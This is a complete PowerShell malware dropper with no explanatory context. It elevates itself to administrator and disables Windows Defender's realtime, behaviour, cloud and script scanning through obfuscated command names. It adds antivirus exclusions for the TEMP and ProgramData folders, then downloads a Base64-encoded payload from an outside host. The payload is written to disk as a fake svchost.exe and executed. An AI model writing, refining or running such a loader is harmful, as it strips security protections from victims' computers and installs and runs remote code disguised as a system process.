# Self-elevate
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    exit
}

# Obfuscated Defender disable
$p1='Set-MpPref';$p2='erence';$cmd=$p1+$p2
$props=@('DisableRealtimeMonitoring','DisableIOAVProtection','DisableNetworkProtection','DisableBehaviorMonitoring','DisableBlockAtFirstSeen','DisableCloudProtection','DisableArchiveScanning','DisableScriptScanning')
foreach($prop in $props){& $cmd -$prop $true -Force}
$excl='Add-MpPref'+'erence'
& $excl -ExclusionPath "$env:TEMP" -Force
& $excl -ExclusionPath "$env:ProgramData" -Force
& $excl -ExclusionProcess "svchost.exe" -Force

# Download the Base64 text
$wc = New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent', 'Mozilla/5.0')
$b64 = $wc.DownloadString('https://kekman.space/encoded.txt')

# Decode Base64 to bytes and write to disk
$bytes = [Convert]::FromBase64String($b64)
$out = "$env:TEMP\svchost.exe"
[System.IO.File]::WriteAllBytes($out, $bytes)

# Execute
Start-Process $out